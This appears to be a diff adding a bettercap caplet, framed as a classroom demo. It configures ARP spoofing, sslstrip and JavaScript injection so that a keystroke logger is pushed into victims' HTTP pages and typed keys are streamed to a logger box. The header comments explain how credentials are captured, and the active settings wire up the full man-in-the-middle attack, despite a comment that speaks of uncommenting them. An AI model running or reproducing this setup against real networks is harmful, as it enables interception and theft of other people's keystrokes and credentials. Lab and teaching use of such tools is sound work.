@@ -1,0 +1,48 @@
+# bettercap.cap — classroom demo: inject bettercap.js keystroke logger into HTTP pages
+#
+# LAB / CLASSROOM DEMO ONLY — only on your own network, your own devices,
+# with explicit consent. Wipe run/*.log after class.
+#
+# What it does: bettercap's jsinject proxy module injects bettercap.js
+# (this folder) into every HTTP page the demo devices visit. The payload
+# streams live keystrokes to your logger box, viewable with live_view.py —
+# same stream as the captive-portal sensor.
+#
+# Setup (do once):
+#   1) Edit bettercap.js -> set LOGGER to your logger box IP
+#      (default http://192.168.4.1, i.e. this project's gateway).
+#   2) Start the logger FIRST so POST /keys has somewhere to land:
+#        sudo ./run.sh            # full AP + portal (recommended demo), or
+#        python3 portal_server.py --portal-dir my-portals/school-demo \
+#          --port 80 --ap-iface lo --state-file /tmp/m --submit-log /tmp/s
+#      Watch it live:  python3 live_view.py --port 80
+#
+# Run (from this folder):
+#   sudo bettercap -iface wlan1 -caplet bettercap.cap
+#   # then in bettercap, for a full MITM on lab targets:
+#   #   set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.4.10; arp.spoof on
+#
+# Notes:
+#   - Stock http.proxy only sees HTTP. For HTTPS you need https.proxy + your
+#     lab CA installed on the demo devices (bettercap hstshijack caplets).
+#     An https:// page cannot exfiltrate to an http:// logger (mixed-content
+#     block): on submit the payload still drops a same-origin /__bc_keys
+#     beacon so credentials show in bettercap's own HTTP log.
+#   - jsinject re-reads bettercap.js on every response: you can tweak LOGGER
+#     or the payload mid-demo without restarting bettercap.
+
+# --- injection wiring (absolute paths: edit the second line if you moved the project) ---
+set http.proxy.script /usr/share/bettercap/caplets/jsinject/jsinject.js
+set jsinject.payload /home/kali/Desktop/hostapd-with-any-captive-portal/hostapd-with-any-captive-portal/bettercap.js
+
+# --- proxies / discovery ---
+set http.proxy.sslstrip true
+set net.sniff.verbose false
+net.probe on
+http.proxy on
+
+# --- full MITM (uncomment for the lab; targets #= consenting demo devices only) --
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.106
+arp.spoof on
+net.sniff on
